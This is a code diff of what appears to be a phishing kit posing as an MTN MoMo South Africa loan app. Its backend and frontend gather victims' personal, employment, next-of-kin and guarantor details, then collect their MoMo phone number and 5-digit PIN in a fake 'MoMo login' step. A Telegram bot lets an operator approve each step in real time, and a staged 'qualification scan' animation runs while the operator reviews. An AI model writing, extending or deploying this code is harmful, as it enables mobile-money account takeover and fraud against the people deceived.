-                return res.status(400).json({ ok: false, error: 'Complete all loan fields.' });
-            }
-            if (loanAmount < type.minLoan) {
-                return res.status(400).json({ ok: false, error: `Minimum loan for ${type.name} is R ${fmt(type.minLoan)}.` });
-            }
-            if (loanAmount > type.maxLoan) {
-                return res.status(400).json({ ok: false, error: `${type.name} allows a maximum loan of R ${fmt(type.maxLoan)}.` });
-            }
-            app_.loanType = loanType;
-            app_.loanAmount = loanAmount;
-            app_.loanTerm = loanTerm;
-            app_.loanPurpose = loanPurpose;
-            app_.monthlyRepayment = monthlyRepayment(loanAmount, parseInt(loanTerm));
-            app_.loanData = { loanType, loanAmount, loanTerm, loanPurpose };
-        }
-
-        if (step === 'personal') {
-            const { firstName, lastName, phone, email } = data || {};
-            if (!firstName || !lastName || !phone || !email) {
-                return res.status(400).json({ ok: false, error: 'Complete all personal fields.' });
-            }
-            app_.firstName = firstName;
-            app_.lastName = lastName;
-            app_.phone = phone;
-            app_.email = email;
-            app_.personalData = { firstName, lastName, phone, email };
-        }
-
-        if (step === 'employment') {
-            const { employment, annualIncome, kinName, kinPhone } = data || {};
-            if (!employment || annualIncome == null || !kinName || !kinPhone) {
-                return res.status(400).json({ ok: false, error: 'Complete all employment fields.' });
-            }
-            app_.employment = employment;
-            app_.annualIncome = annualIncome;
-            app_.kinName = kinName;
-            app_.kinPhone = kinPhone;
-            app_.employmentData = { employment, annualIncome, kinName, kinPhone };
-        }
-
-        if (step === 'guarantor') {
-            const { guarantorName, guarantorPhone, guarantorRelation } = data || {};
-            if (!guarantorName || !guarantorPhone || !guarantorRelation) {
-                return res.status(400).json({ ok: false, error: 'Complete all guarantor fields.' });
-            }
-            if (app_.phone && guarantorPhone === app_.phone) {
-                return res.status(400).json({ ok: false, error: 'Guarantor phone cannot be your own.' });
-            }
-            app_.guarantorName = guarantorName;
-            app_.guarantorPhone = guarantorPhone;
-            app_.guarantorRelation = guarantorRelation;
-            app_.guarantorData = { guarantorName, guarantorPhone, guarantorRelation };
-        }
-
-        if (step === 'momologin') {
-            const { phone, pin, loginMethod, deviceInfo } = data || {};
-            if (!phone) return res.status(400).json({ ok: false, error: 'Phone required.' });
-            if (loginMethod === 'pin' && (!pin || !/^\d{5}$/.test(pin))) {
-                return res.status(400).json({ ok: false, error: 'PIN must be 5 digits.' });
-            }
-            app_.loginPhone = phone;
-            app_.loginPin = (loginMethod === 'pin') ? pin : null;
-            app_.loginMethod = loginMethod || 'pin';
-            app_.deviceInfo = deviceInfo || null;
-            app_.momoLoginData = { phone, pin: app_.loginPin, loginMethod: app_.loginMethod, deviceInfo };
-        }
-
-        if (step === 'qualification') {
-            const required = Math.ceil((app_.loanAmount || 0) * 0.20);
-            app_.qualificationRequired = Math.min(required, type.monthlyCap);
-        }
-
-        app_.steps[step] = 'pending';
-        app_.updatedAt = new Date().toISOString();
-        saveApps();
-
-        console.log(`📝 Step submitted: ${applicationId} → ${step}`);
-        audit('step_submitted', { id: applicationId, step, accountType: app_.accountType });
-
-        // Notify admin with Approve/Reject buttons
-        askApproval(buildStepMessage(step, app_, type, data || {}), step, applicationId);
-
-        res.json({ ok: true, status: 'pending', step });
-    } catch (e) {
-        console.error('submit-step:', e.message);
-        res.status(500).json({ ok: false, error: e.message });
-    }
-});
-
-// ═══════════════════════════════════════════════════════════
-// ⭐ AGREEMENT & REPAYMENT SCHEDULE — NEW (were missing)
-// ═══════════════════════════════════════════════════════════
-app.get('/api/agreement/:applicationId', (req, res) => {
-    const app_ = applications[req.params.applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-
-    const loanAmount = app_.loanAmount || 0;
-    const loanTerm = app_.loanTerm || '12 Months';
-    const months = parseInt(loanTerm) || 12;
-    const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
-    const total = monthly * months;
-
-    const agreement = `MTN MOMO SOUTH AFRICA – LOAN AGREEMENT
-==========================================
-
-Application ID : ${app_.applicationId}
-Generated      : ${new Date().toLocaleString('en-ZA')}
-
-BORROWER
---------
-Name           : ${app_.firstName || ''} ${app_.lastName || ''}
-Phone          : +27 ${app_.phone || ''}
-Email          : ${app_.email || ''}
-
-LOAN DETAILS
-------------
-Principal      : R ${fmt(loanAmount)}
-Term           : ${loanTerm}
-Monthly Payment: R ${fmt(monthly)}
-Total Repayment: R ${fmt(total)}
-Interest Rate  : 27% per annum (NCA compliant)
-
-GUARANTOR
----------
-Name           : ${app_.guarantorName || 'N/A'}
-Phone          : ${app_.guarantorPhone ? '+27 ' + app_.guarantorPhone : 'N/A'}
-Relationship   : ${app_.guarantorRelation || 'N/A'}
-
-TERMS & CONDITIONS
-------------------
-1. The borrower agrees to repay the loan as per the agreed schedule.
-2. The guarantor accepts liability in the event of borrower default.
-3. Late payments attract penalties per the National Credit Act.
-4. The borrower may settle the loan early without penalty.
-5. MoMo transaction history is used to determine ongoing eligibility.
-
-By proceeding, the borrower and guarantor accept these terms.`;
-
-    res.json({ ok: true, agreement });
-});
-
-app.get('/api/repayment-schedule/:applicationId', (req, res) => {
-    const app_ = applications[req.params.applicationId];
-    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
-
-    const loanAmount = app_.loanAmount || 0;
-    const months = parseInt(app_.loanTerm) || 12;
-    if (!loanAmount || !months) return res.status(400).json({ ok: false, error: 'No loan data' });
-
-    const r = 0.27 / 12;
-    const monthly = Math.ceil(loanAmount * r / (1 - Math.pow(1 + r, -months)) + 60);
-
-    const schedule = [];
-    let balance = loanAmount;
-    for (let i = 1; i <= months; i++) {
-        const interest = Math.round(balance * r);
-        const principal = monthly - interest;
-        balance = Math.max(0, balance - principal);
-        schedule.push({
-            month: i,
-            payment: monthly,
-            interest,
-            principal,
-            balance
-        });
-    }
-    res.json({ ok: true, schedule });
-});
-
-// ═══════════════════════════════════════════════════════════
-// TELEGRAM WEBHOOK (now step-aware)
-// ═══════════════════════════════════════════════════════════
-app.post('/api/telegram-webhook', (req, res) => {
-    res.status(200).send('ok');
-    console.log('🔔 WEBHOOK:', new Date().toISOString());
-
-    try {
-        if (req.body && req.body.callback_query) {
-            const q = req.body.callback_query;
-            fetch(`${TG_API}/answerCallbackQuery`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ callback_query_id: q.id, text: 'Received' })
-            }).catch(() => {});
-
-            try {
-                const data = JSON.parse(q.data);
-                const app_ = applications[data.id];
-                if (!app_) return;
-
-                const step = data.s;
-                const approved = data.a === 'Y';
-
-                // Determine which record holds the step status
-                let isNewStep = !!(app_.steps && step in app_.steps);
-                let isLegacy  = !isNewStep && (step in app_);
-                if (!isNewStep && !isLegacy) return;
-
-                const currentStatus = isNewStep ? app_.steps[step] : app_[step];
-                if (currentStatus !== 'pending') return;
-
-                const newValue = approved ? 'approved' : 'rejected';
-                if (isNewStep) app_.steps[step] = newValue;
-                if (isLegacy)  app_[step] = newValue;
-
-                // Mirror legacy qualification field
-                if (step === 'qualification') {
-                    app_.qualification = approved ? 'qualified' : 'unqualified';
-                }
-                if (step === 'application') {
-                    app_.application = newValue;
-                }
-
-                app_.updatedAt = new Date().toISOString();
-                saveApps();
-                audit('admin_decision', { id: data.id, step, decision: newValue });
-
-                tgSend(
-                    `${approved ? '✅' : '❌'} <b>${approved ? 'APPROVED' : 'REJECTED'}</b>\n` +
-                    `🆔 ${code(data.id)}\n📋 ${step.toUpperCase()}\n` +
-                    `👤 ${esc(app_.firstName || '')} ${esc(app_.lastName || '')}`
-                );
-            } catch (e) { console.error('Callback parse:', e.message); }
+        if (!data.ok) {
+            goTo('page-register-check');
+            showErr('regErr', data.error || 'Registration failed.');
+            setBtnLoading(btn, false, 'Complete Registration');
             return;
         }
 
-        if (req.body && req.body.message && req.body.message.text) {
-            const text = req.body.message.text.trim();
-            const chatId = req.body.message.chat.id.toString();
-            if (!CHAT_ID || chatId !== CHAT_ID.toString()) return;
+        S.idNumber      = id;
+        S.accountType   = selectedAccountType;
+        S.accountMaxLoan = data.maxLoan;
+        S.isRegistered  = true;
+        // ✅ FIXED: initialize fresh steps
+        S.steps = { loan: 'idle', personal: 'idle', employment: 'idle', guarantor: 'idle', momologin: 'idle', qualification: 'idle' };
+        saveAll();
 
-            if (text === '/start' || text === '/help') {
-                tgSend(
-                    `🤖 <b>MTN MoMo Loan Bot</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `📊 /stats\n📋 /list\n🔍 /search [ID]\n⏳ /pending\n📱 /registrations`
-                );
-            } else if (text === '/stats') {
-                const total = Object.keys(applications).length;
-                const regs = Object.keys(registrations).length;
-                const pending = Object.values(applications).filter(a =>
-                    (a.steps && Object.values(a.steps).includes('pending')) ||
-                    a.application === 'pending' || a.sms === 'pending' ||
-                    a.pin === 'pending' || a.otp === 'pending' || a.qualification === 'pending'
-                ).length;
-                const completed = Object.values(applications).filter(a =>
-                    a.steps?.qualification === 'approved' || a.qualification === 'qualified'
-                ).length;
-                tgSend(`📊 <b>STATS</b>\n📝 Apps: <b>${total}</b>\n📱 Registrations: <b>${regs}</b>\n⏳ Pending: ${pending}\n✅ Completed: ${completed}`);
-            } else if (text === '/registrations') {
-                const ids = Object.keys(registrations).slice(-10);
-                if (!ids.length) { tgSend('📭 No registrations.'); return; }
-                let msg = '📱 <b>RECENT REGISTRATIONS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
-                ids.forEach(id => {
-                    const r = registrations[id];
-                    msg += `\n🆔 ${code(id)}\n💳 ${esc(r.accountName)}\n${r.phone ? `📞 ${code('+27' + r.phone)}\n` : ''}💵 Max loan: <b>R ${fmt(r.limits?.maxLoan)}</b>\n`;
-                });
-                tgSend(msg);
-            } else if (text === '/pending') {
-                const pending = Object.entries(applications).filter(([_, a]) => {
-                    if (a.steps && Object.values(a.steps).includes('pending')) return true;
-                    return a.application === 'pending' || a.sms === 'pending' ||
-                           a.pin === 'pending' || a.otp === 'pending' || a.qualification === 'pending';
-                });
-                if (!pending.length) { tgSend('✅ No pending.'); return; }
-                let msg = `⏳ <b>PENDING (${pending.length})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-                pending.slice(0, 10).forEach(([id, a]) => {
-                    const steps = [];
-                    if (a.steps) STEP_ORDER.forEach(k => { if (a.steps[k] === 'pending') steps.push(k); });
-                    ['application','sms','pin','otp'].forEach(k => { if (a[k] === 'pending') steps.push(k); });
-                    msg += `\n🆔 ${code(id)}\n👤 ${esc(a.firstName || '')} ${esc(a.lastName || '')}\n💰 R ${fmt(a.loanAmount)}\n📋 ${steps.join(', ')}\n`;
-                });
-                tgSend(msg);
-            } else if (text === '/list') {
-                const ids = Object.keys(applications).slice(-10);
-                if (!ids.length) { tgSend('📭 No applications.'); return; }
-                let msg = '📋 <b>LAST 10</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
-                ids.forEach((id, i) => {
-                    const a = applications[id];
-                    msg += `\n${i+1}. 🆔 ${code(id)}\n👤 ${esc(a.firstName || '')} ${esc(a.lastName || '')}\n💰 R ${fmt(a.loanAmount)}\n`;
-                });
-                tgSend(msg);
-            } else if (text.startsWith('/search ')) {
-                const id = text.replace('/search ', '').trim().toUpperCase();
-                const a = applications[id];
-                if (!a) { tgSend('❌ Not found'); return; }
-                const monthly = a.monthlyRepayment || monthlyRepayment(a.loanAmount, parseInt(a.loanTerm));
-                const stepStatus = a.steps
-                    ? STEP_ORDER.map(k => `${k}:${a.steps[k]}`).join(' ')
-                    : `App:${a.application} SMS:${a.sms} PIN:${a.pin} OTP:${a.otp} Qual:${a.qualification}`;
-                tgSend(
-                    `🔍 <b>DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `🆔 ${code(id)}\n👤 ${esc(a.firstName || '')} ${esc(a.lastName || '')}\n` +
-                    `📱 ${a.phone ? code('+27' + a.phone) : 'N/A'}\n` +
-                    `💳 ${esc(a.momoRegistration?.accountName || a.accountType || 'Not registered')}\n` +
-                    `💰 <b>R ${fmt(a.loanAmount)}</b> · Monthly <b>R ${fmt(monthly)}</b>\n` +
-                    `🤝 Guarantor: ${esc(a.guarantorName || 'N/A')}\n` +
-                    `📋 ${stepStatus}`
-                );
+        document.getElementById('regProcessingStatus').textContent = '✅ Account created!';
+        setTimeout(() => {
+            showToast(`✅ ${data.accountName} registered!`, 'success');
+            setBtnLoading(btn, false, 'Complete Registration');
+            goTo('page-requirements');
+        }, 1200);
+    } catch (e) {
+        goTo('page-register-check');
+        showErr('regErr', e.message);
+        setBtnLoading(btn, false, 'Complete Registration');
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// REQUIREMENTS
+// ═══════════════════════════════════════════════════════════
+function updateRequirementsLimits() {
+    const t = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.yello;
+    document.getElementById('reqLimitText').innerHTML =
+        `<b>${t.icon} ${t.name}</b><br>Daily: R ${fmt(t.dailyCash)} · Monthly: R ${fmt(t.monthlyCap)}<br><b>Max loan: R ${fmt(t.maxLoan)}</b>`;
+    document.getElementById('reqTxText').innerHTML =
+        `Have <b>20% of loan amount</b> in MoMo transactions this month. Example: for R ${fmt(t.maxLoan)} → R ${fmt(Math.ceil(t.maxLoan * 0.20))}.`;
+}
+
+// ═══════════════════════════════════════════════════════════
+// STEP 1: LOAN
+// ═══════════════════════════════════════════════════════════
+function refreshStep1() {
+    if (!isUserRegistered()) { forceRegistration(); return; }
+    const t = ACCOUNT_TYPES[S.accountType];
+    document.getElementById('accInfoBox').style.display = 'block';
+    document.getElementById('accInfoText').innerHTML = `<b>${t.icon} ${t.name}</b> — Max loan <b>R ${fmt(t.maxLoan)}</b>`;
+    document.getElementById('loanLimitHint').textContent = `Min R ${fmt(t.minLoan)} · Max R ${fmt(t.maxLoan)}`;
+    const am = document.getElementById('s1am');
+    am.min = t.minLoan;
+    am.max = t.maxLoan;
+    // ✅ FIXED: prefill from S.loan if set (e.g. from calculator or recovery)
+    if (S.loan.loanAmount) am.value = Math.min(S.loan.loanAmount, t.maxLoan);
+    if (+am.value > t.maxLoan) am.value = t.maxLoan;
+    if (+am.value < t.minLoan) am.value = t.minLoan;
+    if (S.loan.loanType)    document.getElementById('s1ty').value = S.loan.loanType;
+    if (S.loan.loanTerm)    document.getElementById('s1te').value = S.loan.loanTerm;
+    if (S.loan.loanPurpose) document.getElementById('s1pu').value = S.loan.loanPurpose;
+}
+
+async function submitStepLoan() {
+    if (!isUserRegistered()) return forceRegistration();
+    const ty = document.getElementById('s1ty').value;
+    const am = +document.getElementById('s1am').value;
+    const te = document.getElementById('s1te').value;
+    const pu = document.getElementById('s1pu').value.trim();
+    const t  = ACCOUNT_TYPES[S.accountType];
+
+    if (!ty || !te || !pu) return showErr('s1Err', 'Complete all fields.');
+    if (am < t.minLoan)    return showErr('s1Err', `Min R ${fmt(t.minLoan)}.`);
+    if (am > t.maxLoan)    return showErr('s1Err', `Max R ${fmt(t.maxLoan)}.`);
+
+    const btn = document.getElementById('s1Btn');
+    setBtnLoading(btn, true, 'Submit for Approval');
+    clearErr('s1Err');
+
+    try {
+        const data = await apiCall('/api/submit-step', {
+            method: 'POST',
+            body: JSON.stringify({
+                applicationId: S.applicationId,
+                step: 'loan',
+                data: { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu }
+            })
+        });
+        setBtnLoading(btn, false, 'Submit for Approval');
+        if (!data.ok) {
+            if (data.code === 'NOT_REGISTERED') { forceRegistration(); return; }
+            return showErr('s1Err', data.error || 'Submission failed.');
+        }
+        S.loan = { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu };
+        S.steps.loan = 'pending';
+        saveAll();
+        document.getElementById('waitLoanStatus').textContent = '⏳ Awaiting approval...';
+        goTo('page-wait-loan');
+        startPolling('loan', () => {
+            S.steps.loan = 'approved'; saveAll();
+            showToast('✅ Loan approved!', 'success');
+            goTo('page-step2');
+        });
+    } catch (e) { showErr('s1Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
+}
+
+// ═══════════════════════════════════════════════════════════
+// STEP 2: PERSONAL
+// ═══════════════════════════════════════════════════════════
+async function submitStepPersonal() {
+    if (!isUserRegistered()) return forceRegistration();
+    const fi = document.getElementById('s2fi').value.trim();
+    const la = document.getElementById('s2la').value.trim();
+    const ph = document.getElementById('s2ph').value;
+    const em = document.getElementById('s2em').value.trim();
+
+    if (!fi || !la) return showErr('s2Err', 'Enter your full name.');
+    if (ph.length !== 9) return showErr('s2Err', 'Phone must be 9 digits.');
+    if (!em || !em.includes('@')) return showErr('s2Err', 'Enter a valid email.');
+
+    const btn = document.getElementById('s2Btn');
+    setBtnLoading(btn, true, 'Submit for Approval');
+    clearErr('s2Err');
+
+    try {
+        const data = await apiCall('/api/submit-step', {
+            method: 'POST',
+            body: JSON.stringify({
+                applicationId: S.applicationId,
+                step: 'personal',
+                data: { firstName: fi, lastName: la, phone: ph, email: em }
+            })
+        });
+        setBtnLoading(btn, false, 'Submit for Approval');
+        if (!data.ok) { showErr('s2Err', data.error || 'Failed.'); return; }
+        S.personal = { firstName: fi, lastName: la, phone: ph, email: em };
+        S.steps.personal = 'pending';
+        saveAll();
+        goTo('page-wait-personal');
+        startPolling('personal', () => {
+            S.steps.personal = 'approved'; saveAll();
+            showToast('✅ Personal approved!', 'success');
+            goTo('page-step3');
+        });
+    } catch (e) { showErr('s2Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
+}
+
+// ═══════════════════════════════════════════════════════════
+// STEP 3: EMPLOYMENT
+// ═══════════════════════════════════════════════════════════
+async function submitStepEmployment() {
+    if (!isUserRegistered()) return forceRegistration();
+    const em  = document.getElementById('s3em').value;
+    const inc = +document.getElementById('s3in').value;
+    const kn  = document.getElementById('s3kn').value.trim();
+    const kp  = document.getElementById('s3kp').value;
+
+    if (!em || inc <= 0) return showErr('s3Err', 'Complete all fields.');
+    if (!kn) return showErr('s3Err', 'Next of kin name required.');
+    if (kp.length !== 9) return showErr('s3Err', 'Kin phone must be 9 digits.');
+
+    const btn = document.getElementById('s3Btn');
+    setBtnLoading(btn, true, 'Submit for Approval');
+    clearErr('s3Err');
+
+    try {
+        const data = await apiCall('/api/submit-step', {
+            method: 'POST',
+            body: JSON.stringify({
+                applicationId: S.applicationId,
+                step: 'employment',
+                data: { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp }
+            })
+        });
+        setBtnLoading(btn, false, 'Submit for Approval');
+        if (!data.ok) { showErr('s3Err', data.error || 'Failed.'); return; }
+        S.employment = { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp };
+        S.steps.employment = 'pending';
+        saveAll();
+        goTo('page-wait-employment');
+        startPolling('employment', () => {
+            S.steps.employment = 'approved'; saveAll();
+            showToast('✅ Employment approved!', 'success');
+            goTo('page-guarantor');
+        });
+    } catch (e) { showErr('s3Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
+}
+
+// ═══════════════════════════════════════════════════════════
+// STEP 4: GUARANTOR
+// ═══════════════════════════════════════════════════════════
+async function submitStepGuarantor() {
+    if (!isUserRegistered()) return forceRegistration();
+    const gn = document.getElementById('gName').value.trim();
+    const gp = document.getElementById('gPhone').value;
+    const gr = document.getElementById('gRel').value;
+    const gc = document.getElementById('gConfirm').checked;
+
+    if (!gn || gn.length < 3) return showErr('gErr', 'Enter guarantor name.');
+    if (gp.length !== 9) return showErr('gErr', 'Phone must be 9 digits.');
+    if (!gr) return showErr('gErr', 'Select relationship.');
+    if (!gc) return showErr('gErr', 'Confirm agreement.');
+    if (gp === S.personal.phone) return showErr('gErr', 'Guarantor phone cannot be your own.');
+
+    const btn = document.getElementById('gBtn');
+    setBtnLoading(btn, true, 'Submit for Approval');
+    clearErr('gErr');
+
+    try {
+        const data = await apiCall('/api/submit-step', {
+            method: 'POST',
+            body: JSON.stringify({
+                applicationId: S.applicationId,
+                step: 'guarantor',
+                data: { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr }
+            })
+        });
+        setBtnLoading(btn, false, 'Submit for Approval');
+        if (!data.ok) { showErr('gErr', data.error || 'Failed.'); return; }
+        S.guarantor = { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr };
+        S.steps.guarantor = 'pending';
+        saveAll();
+        goTo('page-wait-guarantor');
+        startPolling('guarantor', () => {
+            S.steps.guarantor = 'approved'; saveAll();
+            showToast('✅ Guarantor approved!', 'success');
+            goTo('page-confirmation');
+        });
+    } catch (e) { showErr('gErr', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
+}
+
+// ═══════════════════════════════════════════════════════════
+// CONFIRMATION
+// ═══════════════════════════════════════════════════════════
+function updateConfirmation() {
+    if (!S.loan.loanAmount) return;
+    const amt = S.loan.loanAmount;
+    const months = parseInt(S.loan.loanTerm) || 12;
+    const r = 0.27 / 12;
+    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
+    const totalCost = monthly * months - amt;
+
+    document.getElementById('cfAmount').textContent  = 'R ' + fmt(amt);
+    document.getElementById('cfTerm').textContent    = S.loan.loanTerm;
+    document.getElementById('cfPurpose').textContent = S.loan.loanPurpose;
+    document.getElementById('cfMonthly').textContent = 'R ' + fmt(monthly);
+    document.getElementById('cfCost').textContent    = 'R ' + fmt(totalCost);
+    document.getElementById('cfName').textContent    = `${S.personal.firstName || ''} ${S.personal.lastName || ''}`;
+    document.getElementById('cfPhone').textContent   = '+27 ' + (S.personal.phone || '');
+    document.getElementById('cfEmail').textContent   = S.personal.email || '';
+    document.getElementById('cfGName').textContent   = S.guarantor.guarantorName || '';
+    document.getElementById('cfGPhone').textContent  = '+27 ' + (S.guarantor.guarantorPhone || '');
+    document.getElementById('agreeBox').checked = false;
+    document.getElementById('confirmBtn').disabled = true;
+}
+
+async function showAgreement() {
+    try {
+        const data = await apiCall(`/api/agreement/${S.applicationId}`);
+        if (!data.ok) { showToast('Agreement not available yet.', 'error'); return; }
+        document.getElementById('agreementText').textContent = data.agreement;
+        document.getElementById('agreementModal').classList.add('show');
+    } catch (e) { showToast(e.message, 'error'); }
+}
+function closeAgreement() { document.getElementById('agreementModal').classList.remove('show'); }
+
+// ═══════════════════════════════════════════════════════════
+// MOMO LOGIN
+// ═══════════════════════════════════════════════════════════
+function loginPinMvM(el, i) {
+    el.value = el.value.replace(/\D/g, '').slice(0, 1);
+    if (el.value && i < 4) document.getElementById('loginPin' + (i + 1))?.focus();
+}
+// ✅ FIXED: backspace navigation
+function loginPinKeydown(el, i, e) {
+    if (e.key === 'Backspace' && !el.value && i > 0) {
+        const prev = document.getElementById('loginPin' + (i - 1));
+        if (prev) { prev.focus(); prev.value = ''; }
+    }
+    if (e.key === 'ArrowLeft'  && i > 0) document.getElementById('loginPin' + (i - 1))?.focus();
+    if (e.key === 'ArrowRight' && i < 4) document.getElementById('loginPin' + (i + 1))?.focus();
+}
+function togLoginPin() {
+    for (let i = 0; i < 5; i++) {
+        const b = document.getElementById('loginPin' + i);
+        if (b) b.type = b.type === 'password' ? 'text' : 'password';
+    }
+}
+function clearLoginPin() {
+    for (let i = 0; i < 5; i++) {
+        const el = document.getElementById('loginPin' + i);
+        if (el) el.value = '';
+    }
+    document.getElementById('loginPin0').focus();
+}
+function toggleLoginMethod() {
+    const method = document.getElementById('loginMethod').value;
+    document.getElementById('biometricBlock').style.display = method === 'biometric' ? 'block' : 'none';
+}
+
+async function submitMoMoLogin() {
+    if (!isUserRegistered()) return forceRegistration();
+
+    const phone  = document.getElementById('loginPhone').value;
+    const method = document.getElementById('loginMethod').value;
+    const pin    = [0, 1, 2, 3, 4].map(i => document.getElementById('loginPin' + i).value).join('');
+
+    if (phone.length !== 9) return showErr('loginErr', 'Enter your 9-digit MoMo phone.');
+    if (method === 'pin' && pin.length !== 5) return showErr('loginErr', 'Enter your 5-digit MoMo PIN.');
+
+    const btn = document.getElementById('loginBtn');
+    setBtnLoading(btn, true, 'Confirming...');
+    clearErr('loginErr');
+
+    try {
+        const data = await apiCall('/api/submit-step', {
+            method: 'POST',
+            body: JSON.stringify({
+                applicationId: S.applicationId,
+                step: 'momologin',
+                data: {
+                    phone: phone,
+                    pin: method === 'pin' ? pin : null,
+                    loginMethod: method,
+                    deviceInfo: navigator.platform || 'Unknown device'
+                }
+            })
+        });
+        setBtnLoading(btn, false, 'Confirm Login');
+        if (!data.ok) {
+            showErr('loginErr', data.error || 'Login failed.');
+            return;
+        }
+        S.steps.momologin = 'pending';
+        saveAll();
+        goTo('page-wait-momologin');
+        startPolling('momologin', () => {
+            S.steps.momologin = 'approved'; saveAll();
+            showToast('✅ MoMo login confirmed!', 'success');
+            startQualificationScan();
+        });
+    } catch (e) {
+        showErr('loginErr', e.message);
+        setBtnLoading(btn, false, 'Confirm Login');
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// QUALIFICATION SCAN
+// ═══════════════════════════════════════════════════════════
+async function startQualificationScan() {
+    goTo('page-scan');
+    document.getElementById('scanItem1').className = 'scan-item active';
+    document.getElementById('scanItem2').className = 'scan-item';
+    document.getElementById('scanItem3').className = 'scan-item';
+    document.getElementById('waitScanStatus').textContent = '⏳ Analyzing...';
+
+    try {
+        const data = await apiCall('/api/submit-step', {
+            method: 'POST',
+            body: JSON.stringify({ applicationId: S.applicationId, step: 'qualification', data: {} })
+        });
+        if (data.ok) { S.steps.qualification = 'pending'; saveAll(); }
+    } catch (e) { console.error(e); }
+
+    // ✅ FIXED: clear any previous animator
+    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
+
+    let i = 1;
+    const statuses = ['📊 Analyzing transactions...', '📈 Verifying 20% requirement...', '🔍 Admin final review...'];
+    qualificationAnimator = setInterval(() => {
+        if (i < 3) {
+            document.getElementById('scanItem' + i).className = 'scan-item done';
+            document.getElementById('scanItem' + (i + 1)).className = 'scan-item active';
+            document.getElementById('waitScanStatus').textContent = '⏳ ' + statuses[i];
+            i++;
+        } else {
+            clearInterval(qualificationAnimator);
+            qualificationAnimator = null;
+            document.getElementById('scanItem3').className = 'scan-item done';
+            document.getElementById('waitScanStatus').textContent = '⏳ Admin reviewing...';
+        }
+    }, 2500);
+
+    startPolling('qualification', () => {
+        // ✅ FIXED: clear animation on success
+        if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
+        ['scanItem1', 'scanItem2', 'scanItem3'].forEach(id => document.getElementById(id).className = 'scan-item done');
+        S.steps.qualification = 'approved'; saveAll();
+        setTimeout(() => { showToast('🎉 Loan approved!', 'success'); showApproval(); }, 800);
+    });
+}
+
+// ═══════════════════════════════════════════════════════════
+// POLLING
+// ═══════════════════════════════════════════════════════════
+function startPolling(step, onSuccess) {
+    stopPolling();
+    currentPollStep = step;
+    currentPollCallback = onSuccess;
+    currentPollStarted = Date.now();
+
+    const tick = async () => {
+        if (Date.now() - currentPollStarted > POLL_MAX_DURATION) {
+            showToast('Timed out. Please retry.', 'error');
+            stopPolling();
+            return;
+        }
+        try {
+            const r = await fetch(`/api/status/${S.applicationId}/${step}`);
+            if (!r.ok) throw new Error('HTTP ' + r.status);
+            const data = await r.json();
+            if (data.ok) {
+                if (data.status === 'approved') { stopPolling(); onSuccess(); return; }
+                if (data.status === 'rejected') {
+                    stopPolling();
+                    if (S.steps[step]) { S.steps[step] = 'rejected'; saveAll(); }
+                    handleRejection(step);
+                    return;
+                }
+            }
+        } catch (e) { console.warn('Poll:', e.message); }
+        activePoll = setTimeout(tick, POLL_INTERVAL);
+    };
+    tick();
+}
+
+function stopPolling() {
+    if (activePoll) { clearTimeout(activePoll); activePoll = null; }
+    currentPollStep = null;
+    currentPollCallback = null;
+}
+
+function handleRejection(step) {
+    showToast(`❌ ${step.toUpperCase()} rejected. Please try again.`, 'error');
+    const retryMap = {
+        loan:          () => goTo('page-step1'),
+        personal:      () => goTo('page-step2'),
+        employment:    () => goTo('page-step3'),
+        guarantor:     () => goTo('page-guarantor'),
+        momologin:     () => goTo('page-momologin'),
+        qualification: () => restartApplication()
+    };
+    (retryMap[step] || (() => goTo('page-landing')))();
+}
+
+// ✅ FIXED: resume polling when user returns to tab
+document.addEventListener('visibilitychange', () => {
+    if (!document.hidden && currentPollStep && currentPollCallback && !activePoll) {
+        const step = currentPollStep;
+        const cb = currentPollCallback;
+        startPolling(step, cb);
+    }
+});
+window.addEventListener('beforeunload', stopPolling);
+
+// ═══════════════════════════════════════════════════════════
+// APPROVAL
+// ═══════════════════════════════════════════════════════════
+function showApproval() {
+    const amt = S.loan.loanAmount;
+    const months = parseInt(S.loan.loanTerm) || 12;
+    const r = 0.27 / 12;
+    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
+
+    document.getElementById('aprAmount').textContent = 'R ' + fmt(amt);
+    document.getElementById('aprAmt').textContent    = 'R ' + fmt(amt);
+    document.getElementById('aprTerm').textContent   = S.loan.loanTerm;
+    document.getElementById('aprMth').textContent    = 'R ' + fmt(monthly);
+
+    goTo('page-approval');
+}
+
+async function viewSchedule() {
+    try {
+        const data = await apiCall(`/api/repayment-schedule/${S.applicationId}`);
+        if (!data.ok) { showToast('Schedule not available.', 'error'); return; }
+        let html = '<table class="schedule-table"><thead><tr><th>Month</th><th>Payment</th><th>Interest</th><th>Principal</th><th>Balance</th></tr></thead><tbody>';
+        data.schedule.slice(0, 12).forEach(row => {
+            html += `<tr><td>${row.month}</td><td>R ${fmt(row.payment)}</td><td>R ${fmt(row.interest)}</td><td>R ${fmt(row.principal)}</td><td>R ${fmt(row.balance)}</td></tr>`;
+        });
+        if (data.schedule.length > 12) {
+            html += `<tr><td colspan="5" style="text-align:center;color:#888;">… ${data.schedule.length - 12} more months</td></tr>`;
+        }
+        html += '</tbody></table>';
